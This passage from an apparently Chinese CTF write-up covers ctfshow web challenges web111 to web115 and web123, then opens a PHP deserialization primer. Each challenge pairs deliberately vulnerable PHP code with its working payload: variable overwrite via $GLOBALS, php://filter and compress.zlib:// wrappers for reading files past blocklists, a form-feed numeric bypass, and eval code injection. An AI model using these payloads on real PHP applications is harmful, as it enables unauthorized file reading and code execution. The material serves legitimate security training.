class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>这次依然考点在于变量覆盖(知识点忘记的话去温习一下web105)，首选需要`v1`含有ctfshow才能过正则，执行getflag函数，所以`v1=ctfshow`，接着再getflag函数里，会把v2的地址传给v1，接着再输出v1，这里我们可以使用php里的全局变量GLOBALS> $GLOBALS ：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>执行过程就是`$ctfshow=&$GLOBALS`(全局变量中会含有flag的变量)，接着再通过var_dump输出$ctfshow### web112<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>像是文件包含首先了解几个函数> **is_file()** 函数检查指定的文件名是否是正常的文件>> **filter()** 函数用于对来自非安全来源的数据（比如用户输入）进行验证和过滤这里首先if语句里需要我们传入的不是文件类型才能执行highlight_file语句来读取flag文件，也就是一个绕过的考点，我们使用`php伪协议`即可，所以payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line"></span><br><span class="line">还有其他：?file=</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>### web113<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:52</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在前面基础上过滤了filter协议，那我们换另一个协议，使用压缩流zlib://<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>### web114<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:02:53</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure>在前面基础上过滤压缩流zlib://还有编码器convert，但是又没过滤filter，所以用前面的payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>### web115<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>了解函数> str_replace()函数：子字符串替换（a,b,c）a被b替换c为结果> is_numeric()函数：检测变量是否为数字或数字字符串> trim()函数：去除字符串首尾处的空白字符（或者其他字符）这里用了is_numeric来判断是不是数字，并且if条件里规定trim($num)移除字符串两侧的字符不能等于36，但后面的if需要等于36才能输出flag，而且自定义函数filter也把16进制和8进制等等封死了，需要绕过过滤，写个脚本看看<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">128</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$a</span> = chr(<span class="variable">$i</span>) . <span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (trim(<span class="variable">$a</span>) !== <span class="string">&#x27;36&#x27;</span> &amp;&amp; is_numeric(<span class="variable">$a</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>发现`%0C`，也就是`\f`分页符可以利用，不会被trim过滤掉，而intval和is_numeric都会忽略这个字符，所以payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure>### web123<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>看到后面有个eval()函数会执行`$c`，所以我们就关注$c和if判断需要的两个post即可在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，所以按理来说我们构造不出`CTF_SHOW.COM`这个变量(因为含有`.`)，但php中有个特性就是如果传入`[`，它被转化为`_`之后，后面的字符就会被保留下来不会被替换，所以payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=18</span><br><span class="line">POSTDATA：</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>这里可能有小伙伴有疑问，为什么`$c`的参数是字符串，不是要和18做比较吗？我们看看这里PHP的字符串与数字的关系。数字字符串可以转换成对应数字，但是纯字符串为0![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web123.png)## 反序列化（254-278）做php反序列化的题总会遇到魔术方法，其实就是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作。常见魔术方法：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__construct 当一个对象创建时被调用，</span><br><span class="line"></span><br><span class="line">__destruct 当一个对象销毁时被调用，</span><br><span class="line"></span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line"></span><br><span class="line">__destruct() 对象被销毁时触发</span><br><span class="line"></span><br><span class="line">__call() 对不存在的方法或者不可访问的方法进行调用就自动调用</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__get() 用于从不可访问的属性读取数据</span><br><span class="line"></span><br><span class="line">__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"></span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br><span class="line"> </span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"> </span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"> </span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"> </span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"> </span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"> </span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"> </span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>注意点：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public          被序列化的时候属性名 不会更改</span><br><span class="line">protected       被序列化的时候属性名 会变成  %00*%00属性名</span><br><span class="line">private         被序列化的时候属性名 会变成  %00类名%00属性名</span><br></pre></td></tr></table></figure>PHP序列化的一些字母标识：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a - array //数组</span><br><span class="line"></span><br><span class="line">b - boolean //布尔型</span><br><span class="line"></span><br><span class="line">d - double //双精度型</span><br><span class="line"></span><br><span class="line">i - integer //整型</span><br><span class="line"></span><br><span class="line">o - common object //公共对象</span><br><span class="line"></span><br><span class="line">r - reference //对象引用</span><br><span class="line"></span><br><span class="line">s - string //字符串型</span><br><span class="line"></span><br><span class="line">C - custom object //自定义对象</span><br><span class="line"></span><br><span class="line">O - class //类</span><br><span class="line"></span><br><span class="line">N - null //空</span><br><span class="line"></span><br><span class="line">R - pointer reference //指针引用</span><br><span class="line"></span><br><span class="line">U - unicode string  //Unicode 编码的字符串</span><br><span class="line"></span><br><span class="line">N - NULL 空</span><br></pre></td></tr></table></figure>例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>O代表类，然后后面11代表类名长度，接着双引号内是类名然后是类中变量的个数：{类型：长度:"值"；类型:长度:"值"...以此类推}### web254<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">//定义好的类和方法</span></span><br><span class="line"><span 